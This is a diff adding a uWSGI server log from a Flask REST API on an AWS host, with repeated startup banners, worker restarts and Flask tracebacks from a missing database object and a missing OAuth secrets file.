@@ -1,0 +1,773 @@
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 00:45:05 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x143eff0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/run.py", line 1, in <module>
+    from app import app
+  File "/var/www/html/items-rest/app.py", line 9, in <module>
+    from resources.login import Login  # google oauth
+  File "/var/www/html/items-rest/resources/login.py", line 20, in <module>
+    open('client_secrets.json', 'r').read())['web']['client_id']
+FileNotFoundError: [Errno 2] No such file or directory: 'client_secrets.json'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 23471)
+spawned uWSGI worker 1 (pid: 23477, cores: 8)
+spawned uWSGI worker 2 (pid: 23478, cores: 8)
+spawned uWSGI worker 3 (pid: 23479, cores: 8)
+spawned uWSGI worker 4 (pid: 23480, cores: 8)
+spawned uWSGI worker 5 (pid: 23481, cores: 8)
+spawned uWSGI worker 6 (pid: 23482, cores: 8)
+spawned uWSGI worker 7 (pid: 23483, cores: 8)
+spawned uWSGI worker 8 (pid: 23484, cores: 8)
+Thu Jun  7 01:44:37 2018 - received message 0 from emperor
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
+worker 5 buried after 2 seconds
+worker 6 buried after 2 seconds
+worker 7 buried after 2 seconds
+worker 8 buried after 2 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 01:44:42 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x22a1ff0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x22a1ff0 pid: 23907 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 23907)
+spawned uWSGI worker 1 (pid: 23911, cores: 8)
+spawned uWSGI worker 2 (pid: 23912, cores: 8)
+spawned uWSGI worker 3 (pid: 23913, cores: 8)
+spawned uWSGI worker 4 (pid: 23914, cores: 8)
+spawned uWSGI worker 5 (pid: 23915, cores: 8)
+spawned uWSGI worker 6 (pid: 23916, cores: 8)
+spawned uWSGI worker 7 (pid: 23917, cores: 8)
+spawned uWSGI worker 8 (pid: 23918, cores: 8)
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 01:46:07 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x16f2ff0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x16f2ff0 pid: 23987 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 23987)
+spawned uWSGI worker 1 (pid: 23991, cores: 8)
+spawned uWSGI worker 2 (pid: 23992, cores: 8)
+spawned uWSGI worker 3 (pid: 23993, cores: 8)
+spawned uWSGI worker 4 (pid: 23994, cores: 8)
+spawned uWSGI worker 5 (pid: 23995, cores: 8)
+spawned uWSGI worker 6 (pid: 23996, cores: 8)
+spawned uWSGI worker 7 (pid: 23997, cores: 8)
+spawned uWSGI worker 8 (pid: 23998, cores: 8)
+Thu Jun  7 01:48:17 2018 - received message 0 from emperor
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
+worker 5 buried after 2 seconds
+worker 6 buried after 2 seconds
+worker 7 buried after 2 seconds
+worker 8 buried after 2 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 01:48:22 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x1a20ff0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1a20ff0 pid: 24098 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 24098)
+spawned uWSGI worker 1 (pid: 24102, cores: 8)
+spawned uWSGI worker 2 (pid: 24103, cores: 8)
+spawned uWSGI worker 3 (pid: 24104, cores: 8)
+spawned uWSGI worker 4 (pid: 24105, cores: 8)
+spawned uWSGI worker 5 (pid: 24106, cores: 8)
+spawned uWSGI worker 6 (pid: 24107, cores: 8)
+spawned uWSGI worker 7 (pid: 24108, cores: 8)
+spawned uWSGI worker 8 (pid: 24109, cores: 8)
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 01:49:47 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x2302f20
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x2302f20 pid: 24177 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 24177)
+spawned uWSGI worker 1 (pid: 24181, cores: 8)
+spawned uWSGI worker 2 (pid: 24182, cores: 8)
+spawned uWSGI worker 3 (pid: 24183, cores: 8)
+spawned uWSGI worker 4 (pid: 24184, cores: 8)
+spawned uWSGI worker 5 (pid: 24185, cores: 8)
+spawned uWSGI worker 6 (pid: 24186, cores: 8)
+spawned uWSGI worker 7 (pid: 24187, cores: 8)
+spawned uWSGI worker 8 (pid: 24188, cores: 8)
+Creating tables
+[2018-06-07 02:33:13,666] ERROR in app: Exception on /user/register/ [POST]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 24181|app: 0|req: 1/1] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 02:33:13 2018] POST /user/register/ => generated 291 bytes in 4 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[2018-06-07 02:33:25,109] ERROR in app: Exception on /user/register/ [POST]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 24181|app: 0|req: 2/2] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 02:33:25 2018] POST /user/register/ => generated 291 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 1)
+Creating tables
+[2018-06-07 02:33:36,060] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 24183|app: 0|req: 1/3] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 02:33:36 2018] GET /users => generated 37 bytes in 4 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[2018-06-07 02:44:26,318] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 24181|app: 0|req: 3/4] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 02:44:26 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 2)
+Creating tables
+[2018-06-07 02:46:11,638] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 24181|app: 0|req: 4/5] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 02:46:11 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 2)
+Thu Jun  7 02:50:25 2018 - received message 0 from emperor
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
+worker 5 buried after 2 seconds
+worker 6 buried after 2 seconds
+worker 7 buried after 2 seconds
+worker 8 buried after 2 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 02:50:30 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x1805f20
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1805f20 pid: 24987 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 24987)
+spawned uWSGI worker 1 (pid: 24991, cores: 8)
+spawned uWSGI worker 2 (pid: 24992, cores: 8)
+spawned uWSGI worker 3 (pid: 24993, cores: 8)
+spawned uWSGI worker 4 (pid: 24994, cores: 8)
+spawned uWSGI worker 5 (pid: 24995, cores: 8)
+spawned uWSGI worker 6 (pid: 24996, cores: 8)
+spawned uWSGI worker 7 (pid: 24997, cores: 8)
+spawned uWSGI worker 8 (pid: 24998, cores: 8)
+Thu Jun  7 02:51:55 2018 - uWSGI worker 7 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jun  7 02:51:55 2018 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.17 (64bit) on [Thu Jun  7 03:02:02 2018] ***
+compiled with version: 5.4.0 20160609 on 07 June 2018 00:21:50
+os: Linux-4.4.0-1060-aws #69-Ubuntu SMP Sun May 20 13:42:07 UTC 2018
+nodename: ip-172-31-20-95
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /var/www/html/items-rest/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3900
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/items-rest/socket.sock fd 3
+Python version: 3.5.2 (default, Nov 23 2017, 16:37:01)  [GCC 5.4.0 20160609]
+Set PythonHome to /var/www/html/items-rest/venv
+Python main interpreter initialized at 0x26fbf20
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1315008 bytes (1284 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/items-rest/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x26fbf20 pid: 1593 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1593)
+spawned uWSGI worker 1 (pid: 1597, cores: 8)
+spawned uWSGI worker 2 (pid: 1598, cores: 8)
+spawned uWSGI worker 3 (pid: 1599, cores: 8)
+spawned uWSGI worker 4 (pid: 1600, cores: 8)
+spawned uWSGI worker 5 (pid: 1601, cores: 8)
+spawned uWSGI worker 6 (pid: 1602, cores: 8)
+spawned uWSGI worker 7 (pid: 1603, cores: 8)
+spawned uWSGI worker 8 (pid: 1604, cores: 8)
+Creating tables
+[2018-06-07 03:02:09,788] ERROR in app: Exception on /user/register/ [POST]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 1599|app: 0|req: 1/1] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 03:02:09 2018] POST /user/register/ => generated 291 bytes in 6 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[2018-06-07 03:02:28,328] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 1/2] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:02:28 2018] GET /users => generated 37 bytes in 4 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[2018-06-07 03:04:16,250] ERROR in app: Exception on /posts [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 2/3] 68.65.67.34 () {42 vars in 717 bytes} [Thu Jun  7 03:04:16 2018] GET /posts => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 1)
+Creating tables
+[2018-06-07 03:04:23,666] ERROR in app: Exception on /posts [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 1602|app: 0|req: 1/4] 68.65.67.34 () {42 vars in 717 bytes} [Thu Jun  7 03:04:23 2018] GET /posts => generated 37 bytes in 4 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[2018-06-07 03:04:27,082] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 3/5] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:04:27 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 1)
+Creating tables
+[2018-06-07 03:05:10,743] ERROR in app: Exception on / [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    db.create_all()
+NameError: name 'db' is not defined
+[pid: 1600|app: 0|req: 1/6] 219.156.194.122 () {28 vars in 306 bytes} [Thu Jun  7 03:05:10 2018] GET / => generated 291 bytes in 4 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+Creating tables
+[2018-06-07 03:07:05,362] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    # db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 4/7] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:07:05 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 3)
+Creating tables
+[2018-06-07 03:07:07,197] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    # db.create_all()
+NameError: name 'db' is not defined
+[pid: 1602|app: 0|req: 2/8] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:07:07 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 2)
+Creating tables
+[2018-06-07 03:08:43,336] ERROR in app: Exception on /users [GET]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    # db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 5/9] 68.65.67.34 () {40 vars in 523 bytes} [Thu Jun  7 03:08:43 2018] GET /users => generated 37 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 90 bytes (1 switches on core 3)
+Creating tables
+[2018-06-07 03:08:50,490] ERROR in app: Exception on /user/register/ [POST]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    # db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 6/10] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 03:08:50 2018] POST /user/register/ => generated 291 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 6)
+Creating tables
+[2018-06-07 03:12:28,522] ERROR in app: Exception on /user/register/ [POST]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    # db.create_all()
+NameError: name 'db' is not defined
+[pid: 1597|app: 0|req: 7/11] 68.65.67.34 () {44 vars in 622 bytes} [Thu Jun  7 03:12:28 2018] POST /user/register/ => generated 291 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 5)
+Creating tables
+[2018-06-07 03:14:22,006] ERROR in app: Exception on /user/register/ [POST]
+Traceback (most recent call last):
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 2292, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1808, in full_dispatch_request
+    self.try_trigger_before_first_request_functions()
+  File "/var/www/html/items-rest/venv/lib/python3.5/site-packages/flask/app.py", line 1855, in try_trigger_before_first_request_functions
+    func()
+  File "/var/www/html/items-rest/app.py", line 22, in create_tables
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE')
